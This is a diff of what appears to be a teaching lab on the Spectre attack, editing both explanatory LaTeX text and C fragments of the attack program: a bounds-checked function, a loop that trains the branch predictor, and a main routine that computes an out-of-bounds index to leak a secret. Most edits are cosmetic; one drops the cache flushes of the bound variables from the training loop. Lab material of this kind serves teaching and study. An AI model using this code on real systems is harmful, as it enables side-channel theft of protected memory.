@@ -426,9 +426,7 @@ uint8_t restrictedAccess(size_t x)
 {
   if (x <= bound_upper && x >= bound_lower) {
      return buffer[x];
-  } else {
-     return 0;
-  }
+  } else { return 0; }
 }
 
 void spectreAttack(size_t index_beyond)
@@ -439,8 +437,6 @@ void spectreAttack(size_t index_beyond)
 
   // Train the CPU to take the true branch inside restrictedAccess().
   for (i = 0; i < 10; i++) {
-      _mm_clflush(&bound_upper);
-      _mm_clflush(&bound_lower);
       restrictedAccess(i);
   }
 
@@ -477,7 +473,7 @@ The offset is definitely beyond the scope of the buffer, so
 it is larger than the upper bound of the buffer or smaller than the 
 lower bound (i.e., a negative number). The offset
 is fed into the \texttt{restrictedAccess()} function.
-Because we have trained the CPU to take the true-branch inside
+Since we have trained the CPU to take the true-branch inside
 \texttt{restrictedAccess()}, the CPU will return \texttt{buffer[index\_beyond]}, which contains
 the value of the secret, in the out-of-order execution. 
 The secret value then causes its corresponding element in \texttt{array[]} to
@@ -550,7 +546,7 @@ void spectreAttack(size_t index_beyond)
 int main() {
   int i;
   uint8_t s;
-  size_t  index_beyond = (size_t)(secret-(char*)buffer);
+  size_t  index_beyond = (size_t)(secret - (char*)buffer);
 
   flushSideChannel();
   for(i=0;i<256; i++) scores[i]=0;
